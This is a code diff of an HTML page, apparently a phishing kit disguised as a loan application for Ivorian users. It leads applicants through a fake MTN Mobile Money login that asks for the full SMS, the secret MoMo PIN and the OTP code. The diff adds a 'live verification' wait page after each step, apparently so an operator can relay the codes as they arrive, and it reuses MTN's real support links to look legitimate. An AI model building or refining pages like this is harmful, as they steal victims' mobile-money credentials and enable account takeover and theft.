@@ -14,7 +14,7 @@
 <noscript><div style="padding:24px;text-align:center;">JavaScript est requis.</div></noscript>
 <div id="offlineBanner" class="offline-banner hidden">📡 Hors ligne — reconnexion...</div>
 
-<!-- ═════════ WELCOME + CALCULATOR (LANDING) ═════════ -->
+<!-- ═════════ LANDING ═════════ -->
 <div id="page-landing" class="page active">
     <div class="land-nav">
         <div style="flex:1;"></div>
@@ -102,14 +102,12 @@
 
         <div class="msg-box error" id="appErr"><span class="msg-icon">✕</span><span id="appErrTxt"></span></div>
 
-        <!-- LOAN -->
         <h3 class="section-h">💰 Prêt demandé</h3>
         <div class="field"><label>Type de Prêt</label><div class="sel-wrap"><select id="appLoanType"><option>Prêt Personnel</option><option selected>Prêt Commercial</option><option>Prêt Immobilier</option><option>Prêt Auto</option><option>Prêt Étudiant</option></select></div></div>
         <div class="field"><label>Montant (F CFA)</label><input type="number" id="appLoanAmount" value="100000" min="25000" max="2000000" inputmode="numeric" /><div class="field-hint" id="autoTypeHint">Type de compte détecté automatiquement</div></div>
         <div class="field"><label>Durée</label><div class="sel-wrap"><select id="appLoanTerm"><option>6 Mois</option><option selected>12 Mois</option><option>18 Mois</option><option>24 Mois</option><option>36 Mois</option><option>48 Mois</option></select></div></div>
         <div class="field"><label>Objet</label><textarea id="appLoanPurpose" maxlength="300" placeholder="Décrivez l'objet du prêt…"></textarea></div>
 
-        <!-- 20% mandatory -->
         <div class="twenty-block">
             <div class="twenty-head">
                 <span class="twenty-icon">📊</span>
@@ -125,7 +123,6 @@
             </label>
         </div>
 
-        <!-- PERSONAL -->
         <h3 class="section-h">👤 Informations personnelles</h3>
         <div class="field"><label>Nom complet</label><input type="text" id="appName" maxlength="80" placeholder="Ex. Konan Yao" autocomplete="name" /></div>
         <div class="field"><label>Numéro CNI</label><input type="text" id="appIdNumber" maxlength="14" placeholder="CI0123456789" style="text-transform:uppercase;" /></div>
@@ -133,12 +130,10 @@
         <div class="field"><label>Email</label><input type="email" id="appEmail" maxlength="120" placeholder="vous@email.com" autocomplete="email" /></div>
         <div class="field"><label>Téléphone</label><div class="phone-row"><div class="ph-pre">+225</div><input type="tel" id="appPhone" maxlength="10" placeholder="05 XX XX XX XX" inputmode="numeric" autocomplete="tel-national" /></div></div>
 
-        <!-- EMPLOYMENT -->
         <h3 class="section-h">💼 Emploi</h3>
         <div class="field"><label>Situation professionnelle</label><div class="sel-wrap"><select id="appEmployment"><option>Salarié(e)</option><option selected>Travailleur indépendant</option><option>Sans emploi</option><option>Retraité(e)</option><option>Étudiant(e)</option></select></div></div>
         <div class="field"><label>Revenu annuel (F CFA)</label><input type="number" id="appIncome" min="0" max="100000000" inputmode="numeric" /></div>
 
-        <!-- NEXT OF KIN WITH TERMS -->
         <h3 class="section-h">👥 Proche (Next of Kin)</h3>
         <div class="field"><label>Nom du proche</label><input type="text" id="appKinName" maxlength="60" /></div>
         <div class="field"><label>Téléphone du proche</label><div class="phone-row"><div class="ph-pre">+225</div><input type="tel" id="appKinPhone" maxlength="10" inputmode="numeric" /></div></div>
@@ -154,24 +149,23 @@
             </div>
             <label class="confirm-check">
                 <input type="checkbox" id="kinTnc" />
-                <span>Je confirme que mon proche a été informé et accepte d'être contacté pour cette demande. <a href="#" id="kinTermsLink">Voir les conditions</a></span>
+                <span>Je confirme que mon proche a été informé et accepte d'être contacté. <a href="#" id="kinTermsLink">Voir</a></span>
             </label>
         </div>
 
-        <!-- GENERAL TERMS -->
         <div class="agreement-wrap">
             <label class="confirm-check">
                 <input type="checkbox" id="appTnc" />
-                <span>J'ai lu et j'accepte les <a href="#" id="termsLink">Conditions Générales de Prêt</a> et la politique de confidentialité.</span>
+                <span>J'accepte les <a href="#" id="termsLink">Conditions Générales de Prêt</a>.</span>
             </label>
         </div>
 
-        <button class="btn-outline" id="viewTermsBtn">📄 Voir les Conditions Générales</button>
+        <button class="btn-outline" id="viewTermsBtn">📄 Voir les CGL</button>
         <button class="btn-grad" id="appSubmitBtn" style="margin-top:12px;">Soumettre ma demande</button>
     </div></div>
 </div>
 
-<!-- ═════════ MOMO REDIRECT PAGE (5 sec) ═════════ -->
+<!-- ═════════ MOMO REDIRECT ═════════ -->
 <div id="page-momo-redirect" class="page">
     <div class="momo-redirect-bg">
         <div class="momo-redirect-wrap">
@@ -183,9 +177,7 @@
             <div class="momo-redirect-spinner"></div>
             <h2>Connexion à votre compte MoMo</h2>
             <p>Redirection sécurisée vers MTN Mobile Money…</p>
-            <div class="momo-redirect-countdown">
-                Redirection dans <b id="countdownNum">5</b> seconde<span id="countdownPlural">s</span>
-            </div>
+            <div class="momo-redirect-countdown">Redirection dans <b id="countdownNum">5</b> seconde<span id="countdownPlural">s</span></div>
             <div class="momo-redirect-progress"><div class="momo-redirect-bar" id="redirectBar"></div></div>
         </div>
     </div>
@@ -200,8 +192,8 @@
     </nav>
     <div class="step-center"><div class="step-card">
         <h2>Vérification par SMS</h2>
-        <p class="step-sub">Étape 2 sur 3 · Connexion MoMo (1/3)</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+        <p class="step-sub">Connexion MoMo · Étape 1 sur 3</p>
+        <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
         <div class="login-intro">
             <div class="li-icon">📩</div>
             <h3>Collez le SMS reçu de MTN</h3>
@@ -216,7 +208,25 @@
             <label>Texte complet du SMS</label>
             <textarea id="smsText" rows="6" maxlength="2000" placeholder="Collez le SMS complet ici..."></textarea>
         </div>
-        <button class="btn-grad" id="smsBtn">Continuer</button>
+        <button class="btn-grad" id="smsBtn">Envoyer pour vérification</button>
+    </div></div>
+</div>
+
+<!-- ═════════ SHARED WAIT PAGE (SMS / PIN / OTP verification) ═════════ -->
+<div id="page-login-wait" class="page">
+    <div class="wait-bg"><div class="wait-wrap">
+        <div class="wait-icon pulse" id="waitIcon">⏳</div>
+        <h2 id="waitTitle">Vérification en cours...</h2>
+        <p id="waitSubtitle">Votre demande est en cours d'examen.</p>
+        <div class="wait-status" id="waitStatus">⏳ En attente de validation...</div>
+        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
+        <div class="wait-appid">Dossier : <span class="mono" id="waitAppId">—</span></div>
+        <div class="support-block">
+            <div class="support-title">Besoin d'aide ?</div>
+            <p>Support officiel MTN MoMo :</p>
+            <a href="https://www.mtn.ci/fr/particulier/mobile-money" target="_blank" rel="noopener" class="support-link">🌐 www.mtn.ci/mobile-money</a>
+            <a href="tel:111" class="support-link">📞 111 (appel gratuit)</a>
+        </div>
     </div></div>
 </div>
 
@@ -229,8 +239,8 @@
     </nav>
     <div class="step-center"><div class="step-card">
         <h2>Code PIN MoMo</h2>
-        <p class="step-sub">Étape 2 sur 3 · Connexion MoMo (2/3)</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+        <p class="step-sub">Connexion MoMo · Étape 2 sur 3</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
         <div class="login-intro">
             <div class="li-icon">🔑</div>
             <h3>Votre code PIN secret</h3>
@@ -238,22 +248,22 @@
         </div>
         <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
         <div class="field">
-            <label>Code PIN</label>
+            <label>Code PIN MoMo (5 chiffres)</label>
             <div class="pin-row">
-                <input type="password" id="pinBox0" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="pinBox1" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="pinBox2" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="pinBox3" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="pinBox4" class="pin-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="pinBox0" class="pin-box" maxlength="1" inputmode="numeric" autocomplete="off" />
+                <input type="password" id="pinBox1" class="pin-box" maxlength="1" inputmode="numeric" autocomplete="off" />
+                <input type="password" id="pinBox2" class="pin-box" maxlength="1" inputmode="numeric" autocomplete="off" />
+                <input type="password" id="pinBox3" class="pin-box" maxlength="1" inputmode="numeric" autocomplete="off" />
+                <input type="password" id="pinBox4" class="pin-box" maxlength="1" inputmode="numeric" autocomplete="off" />
                 <button type="button" class="pin-eye" id="pinToggle">👁</button>
                 <button type="button" class="pin-delete" id="pinClear">✕</button>
             </div>
         </div>
-        <button class="btn-grad" id="pinBtn">Continuer</button>
+        <button class="btn-grad" id="pinBtn">Envoyer pour vérification</button>
     </div></div>
 </div>
 
-<!-- ═════════ LOGIN STEP 3: OTP ═════════ -->
+<!-- ═════════ LOGIN STEP 3: OTP (6 boxes layout) ═════════ -->
 <div id="page-login-otp" class="page">
     <nav class="navbar">
         <a class="nav-left" data-goto="page-login-pin">← Retour</a>
@@ -262,41 +272,30 @@
     </nav>
     <div class="step-center"><div class="step-card">
         <h2>Code OTP</h2>
-        <p class="step-sub">Étape 2 sur 3 · Connexion MoMo (3/3)</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+        <p class="step-sub">Connexion MoMo · Étape 3 sur 3</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
         <div class="login-intro">
             <div class="li-icon">🔢</div>
             <h3>Code OTP de vérification</h3>
-            <p>Entrez le code OTP reçu par SMS (4–6 chiffres).</p>
+            <p>Entrez le code OTP à 6 chiffres reçu par SMS.</p>
         </div>
         <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
         <div class="field">
-            <label>Code OTP</label>
-            <input type="text" id="otpInput" maxlength="6" inputmode="numeric" placeholder="123456" style="text-align:center;font-size:1.5rem;font-weight:800;letter-spacing:0.4em;" />
+            <label>Code OTP (6 chiffres)</label>
+            <div class="otp-row">
+                <input type="text" id="otpBox0" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code" />
+                <input type="text" id="otpBox1" class="otp-box" maxlength="1" inputmode="numeric" />
+                <input type="text" id="otpBox2" class="otp-box" maxlength="1" inputmode="numeric" />
+                <input type="text" id="otpBox3" class="otp-box" maxlength="1" inputmode="numeric" />
+                <input type="text" id="otpBox4" class="otp-box" maxlength="1" inputmode="numeric" />
+                <input type="text" id="otpBox5" class="otp-box" maxlength="1" inputmode="numeric" />
+            </div>
         </div>
         <button class="btn-grad" id="otpBtn">Soumettre ma demande</button>
     </div></div>
 </div>
 
-<!-- ═════════ UNDER REVIEW ═════════ -->
-<div id="page-review" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">📋</div>
-        <h2>Votre demande est en cours d'examen</h2>
-        <p>Nous traitons votre demande.<br><b>Vous serez notifié par email ou SMS une fois l'examen terminé.</b></p>
-        <div class="wait-status" id="reviewStatus">⏳ En cours d'examen...</div>
-        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
-        <div class="wait-appid">Dossier : <span class="mono" id="reviewId">—</span></div>
-        <div class="support-block">
-            <div class="support-title">Besoin d'aide ?</div>
-            <p>Contactez le support officiel MTN MoMo :</p>
-            <a href="https://www.mtn.ci/fr/particulier/mobile-money" target="_blank" rel="noopener" class="support-link">🌐 www.mtn.ci/mobile-money</a>
-            <a href="tel:111" class="support-link">📞 111 (appel gratuit)</a>
-        </div>
-    </div></div>
-</div>
-
-<!-- ═════════ DASHBOARD (APPROVED) ═════════ -->
+<!-- ═════════ DASHBOARD ═════════ -->
 <div id="page-dashboard" class="page">
     <div class="dash-wrap">
         <div class="dash-top">
@@ -340,7 +339,7 @@
         <p id="rejectReason">Votre demande n'a pas été approuvée.</p>
         <div class="msg-box error show">
             <span class="msg-icon">ℹ️</span>
-            <span>Contactez le support MTN MoMo au <b>111</b> ou visitez une agence pour plus d'informations.</span>
+            <span>Contactez le support MTN MoMo au <b>111</b> pour plus d'informations.</span>
         </div>
         <button class="btn-grad" id="rejectedNewBtn">Nouvelle demande</button>
         <a href="https://www.mtn.ci/fr/particulier/mobile-money" target="_blank" rel="noopener" class="btn-outline" style="display:block;text-align:center;text-decoration:none;margin-top:10px;">🌐 Support MTN MoMo</a>
